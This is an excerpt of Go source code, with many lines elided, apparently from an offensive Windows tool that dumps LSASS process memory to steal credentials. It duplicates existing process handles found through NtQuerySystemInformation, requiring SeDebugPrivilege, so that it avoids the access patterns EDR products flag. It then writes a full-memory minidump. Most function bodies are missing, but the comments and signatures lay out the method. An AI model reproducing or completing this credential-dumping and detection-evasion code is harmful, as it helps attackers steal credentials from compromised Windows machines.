...
// that EDRs commonly flag.
//
// Requires SeDebugPrivilege to open donor processes and duplicate their handles.
...
type systemHandleTable struct {
	...
	_               uint32 // alignment on x64
	// Entries follow immediately; accessed via pointer arithmetic below.
}

var procNtQuerySystemInformation = modNtdll.NewProc("NtQuerySystemInformation")

// ntSysHandles queries the kernel handle table via NtQuerySystemInformation.
...
// dupHandleFromSystem finds any process-handle in the system table that refers
// to targetPID and duplicates it into the current process.
func dupHandleFromSystem(targetPID uint32) (windows.Handle, error) {
	...
	// Entries start immediately after the header (8 bytes on x64).
	...
	for i := uint32(0); i < count; i++ {
		...
		// Require at least PROCESS_VM_READ | PROCESS_QUERY_INFORMATION access.
...
// ─── MiniDump (shared with lsass_wer_windows.go) ─────────────────────────────

// miniDumpProcess writes a MiniDumpWithFullMemory dump of hProcess to outPath.
// Used by both LSASS dump techniques.
